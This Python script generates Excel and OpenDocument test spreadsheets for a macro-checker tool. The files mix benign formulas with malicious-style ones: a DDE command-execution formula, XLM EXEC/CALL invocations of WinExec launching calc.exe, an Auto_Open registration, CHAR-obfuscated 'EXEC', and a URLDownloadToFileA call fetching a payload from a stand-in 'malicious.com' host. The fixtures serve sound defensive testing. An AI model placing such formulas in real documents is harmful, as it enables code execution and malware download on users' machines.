#!/usr/bin/env python3
"""
Create test Excel and OpenOffice files with various formulas for testing the macro-checker
"""

from openpyxl import Workbook
from pathlib import Path
from odf.opendocument import OpenDocumentSpreadsheet
from odf.table import Table, TableRow, TableCell
from odf.text import P
from odf import namespaces

def create_test_file():
    wb = Workbook()
    ws = wb.active
    ws.title = "Test Sheet"

    # Add some safe formulas
    ws['A1'] = 'Safe Formula'
    ws['A2'] = '=SUM(B1:B10)'
    ws['A3'] = '=AVERAGE(C1:C5)'
    ws['A4'] = '=IF(D1>10, "Yes", "No")'

    # Add some suspicious formulas
    ws['A6'] = 'Suspicious Formulas'
    ws['A7'] = '=HYPERLINK("http://example.com", "Click here")'
    ws['A8'] = '=WEBSERVICE("http://api.example.com/data")'
    ws['A9'] = '=INDIRECT("A1")'

    # Add suspicious VBA-related cells
    ws['A11'] = 'Suspicious VBA-Related'
    # DDE (Dynamic Data Exchange) - can execute commands
    ws['A12'] = '=cmd|"/c calc.exe"!A1'
    # Excel 4.0 Macro formulas (XLM macros)
    ws['A13'] = '=EXEC("calc.exe")'
    ws['A14'] = '=CALL("kernel32","WinExec","JJJ","calc.exe",1)'
    # References to external VBA functions
    ws['A15'] = '=PERSONAL.XLSB!MyMacro()'
    # Dynamic data retrieval
    ws['A16'] = '=REGISTER("user32","MessageBoxA","JJCCJ","MessageBox")'
    # Potentially dangerous file operations
    ws['A17'] = '=FILES("C:\\*.*")'

    # Add some data
    ws['B1'] = 'Data'
    for i in range(2, 11):
        ws[f'B{i}'] = i * 10

    # Create another sheet
    ws2 = wb.create_sheet("Sheet2")
    ws2['A1'] = 'Another Sheet'
    ws2['A2'] = '=FILTERXML(WEBSERVICE("http://example.com/xml"), "//data")'

    # More suspicious VBA/macro formulas
    ws2['A4'] = 'More Suspicious Content'
    ws2['A5'] = '=CALL("urlmon","URLDownloadToFileA","JJCCJJ",0,"http://malicious.com/payload.exe","C:\\temp\\payload.exe",0,0)'
    ws2['A6'] = '=REGISTER.ID("Auto_Open")'
    ws2['A7'] = '=GET.WORKSPACE(1)'
    ws2['A8'] = '=ALERT("This is a macro",2)'
    # Obfuscated formula attempt
    ws2['A9'] = '=CHAR(69)&CHAR(88)&CHAR(69)&CHAR(67)'  # Spells "EXEC"

    # Save the file
    output_file = Path(__file__).parent / "test_spreadsheet.xlsx"
    wb.save(output_file)
    print(f"Test Excel file created: {output_file}")
    return output_file

def create_ods_test_file():
    """Create an OpenOffice spreadsheet with the same test cases"""
    doc = OpenDocumentSpreadsheet()

    # Create first sheet
    table1 = Table(name="Test Sheet")

    # Helper function to add a cell with text/formula
    def add_cell(row, value):
        cell = TableCell()
        if value and str(value).startswith('='):
            # Set as formula - use proper namespace and don't add formula text as content
            cell.setAttrNS(namespaces.TABLENS, 'formula', 'of:' + value)
            cell.setAttrNS(namespaces.OFFICENS, 'value-type', 'string')
            # Don't add the formula text as content - leave it empty so it executes
        else:
            # Regular text cell
            cell.addElement(P(text=str(value) if value else ''))
        row.addElement(cell)

    # Add some safe formulas
    row = TableRow()
    add_cell(row, 'Safe Formula')
    table1.addElement(row)

    row = TableRow()
    add_cell(row, '=SUM(B1:B10)')
    table1.addElement(row)

    row = TableRow()
    add_cell(row, '=AVERAGE(C1:C5)')
    table1.addElement(row)

    row = TableRow()
    add_cell(row, '=IF(D1>10,"Yes","No")')
    table1.addElement(row)

    # Empty row
    row = TableRow()
    add_cell(row, '')
    table1.addElement(row)

    # Add some suspicious formulas
    row = TableRow()
    add_cell(row, 'Suspicious Formulas')
    table1.addElement(row)

    row = TableRow()
    add_cell(row, '=HYPERLINK("http://example.com","Click here")')
    table1.addElement(row)

    row = TableRow()
    add_cell(row, '=WEBSERVICE("http://api.example.com/data")')
    table1.addElement(row)

    row = TableRow()
    add_cell(row, '=INDIRECT("A1")')
    table1.addElement(row)

    # Empty row
    row = TableRow()
    add_cell(row, '')
    table1.addElement(row)

    # Add suspicious VBA-related cells
    row = TableRow()
    add_cell(row, 'Suspicious VBA-Related')
    table1.addElement(row)

    row = TableRow()
    add_cell(row, '=cmd|"/c calc.exe"!A1')
    table1.addElement(row)

    row = TableRow()
    add_cell(row, '=EXEC("calc.exe")')
    table1.addElement(row)

    row = TableRow()
    add_cell(row, '=CALL("kernel32","WinExec","JJJ","calc.exe",1)')
    table1.addElement(row)

    row = TableRow()
    add_cell(row, '=PERSONAL.XLSB!MyMacro()')
    table1.addElement(row)

    row = TableRow()
    add_cell(row, '=REGISTER("user32","MessageBoxA","JJCCJ","MessageBox")')
    table1.addElement(row)

    row = TableRow()
    add_cell(row, '=FILES("C:\\*.*")')
    table1.addElement(row)

    doc.spreadsheet.addElement(table1)

    # Create second sheet
    table2 = Table(name="Sheet2")

    row = TableRow()
    add_cell(row, 'Another Sheet')
    table2.addElement(row)

    row = TableRow()
    add_cell(row, '=FILTERXML(WEBSERVICE("http://example.com/xml"),"//data")')
    table2.addElement(row)

    # Empty row
    row = TableRow()
    add_cell(row, '')
    table2.addElement(row)

    # More suspicious VBA/macro formulas
    row = TableRow()
    add_cell(row, 'More Suspicious Content')
    table2.addElement(row)

    row = TableRow()
    add_cell(row, '=CALL("urlmon","URLDownloadToFileA","JJCCJJ",0,"http://malicious.com/payload.exe","C:\\temp\\payload.exe",0,0)')
    table2.addElement(row)

    row = TableRow()
    add_cell(row, '=REGISTER.ID("Auto_Open")')
    table2.addElement(row)

    row = TableRow()
    add_cell(row, '=GET.WORKSPACE(1)')
    table2.addElement(row)

    row = TableRow()
    add_cell(row, '=ALERT("This is a macro",2)')
    table2.addElement(row)

    row = TableRow()
    add_cell(row, '=CHAR(69)&CHAR(88)&CHAR(69)&CHAR(67)')
    table2.addElement(row)

    doc.spreadsheet.addElement(table2)

    # Save the file
    output_file = Path(__file__).parent / "test_spreadsheet.ods"
    doc.save(output_file)
    print(f"Test ODS file created: {output_file}")
    return output_file

if __name__ == '__main__':
    create_test_file()
    create_ods_test_file()
